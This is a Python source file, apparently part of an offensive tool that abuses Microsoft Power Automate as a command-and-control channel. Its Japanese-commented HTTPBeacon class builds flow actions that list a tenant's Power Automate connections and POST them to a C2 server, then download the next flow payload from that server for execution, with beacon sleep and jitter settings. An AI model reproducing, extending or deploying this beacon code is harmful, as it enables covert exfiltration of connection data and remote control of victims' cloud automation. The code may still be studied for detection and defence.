from pypowerautomate.flow import *
from pypowerautomate.triggers import *
from pypowerautomate.actions import *
from .base import BaseBeacon


class HTTPBeacon(BaseBeacon):
    """
    PowerAutomate C2用のPayload生成のインターフェースになるクラス
    PowerAutomate Manager Connectorの接続情報を必要とする。

    このPayloadが生成するHTTP通信アクションでは以下のHeaderを定義している

    - Pa-Client-Id:   PowerAutomate C2 Serverがホスト情報を管理するために使用.
                    PowerAutomate Management ConnectorのIDに含まれうUUIDを利用する.

    e.g.) flowmanagement_id=shared-flowmanagemen-282bc0cf-2475-4655-8262-a6938ff6b179
    """

    def __init__(self, flowmanagement_id: str, client_id: str, c2_url: str,
                is_encoded: bool = False, key: str = None, key_length: int = 16, is_init=False, sleep_time:int = 60, jitter: int = 10, has_approval:bool = True, email:str = None):
        super().__init__(flowmanagement_id, client_id, is_encoded, key, key_length, is_init, sleep_time, jitter, has_approval, email)
        self.c2_url = c2_url

    def upload_connections_actions(self) -> Actions:
        """
        Connection情報をHTTPでアップロードする
        """
        upload_actions = Actions()
        upload_actions += ListConnectionsAction("ListConnection")

        http_upload = HttpAction("upload_connection", f"{self.c2_url}/connections", "POST")
        http_upload.set_body("@body('ListConnection')")
        http_upload.set_headers({"Pa-Client-Id": self.client_id})

        upload_actions += http_upload

        return upload_actions

    def download_payload_actions(self) -> Actions:
        """
        Flow内の"payload"という変数に次のフローとなるjsonを設定するアクションを作成する
        """
        download_actions = Actions()
        download_actions += AddToTimeAction("AddToTime_01", "Minute", 1)
        url = f"{self.c2_url}/payload"
        http_getpayload = HttpAction("GetPayload", f"{self.c2_url}/payload", "GET")
        http_getpayload.set_headers({"Pa-Client-Id": self.client_id})
        if self.is_init:
            http_getpayload.set_queries({"init": "true"})
        download_actions += http_getpayload
        download_actions += SetVariableAction("SetPayload", "payload", "@{body('GetPayload')}")
        return download_actions
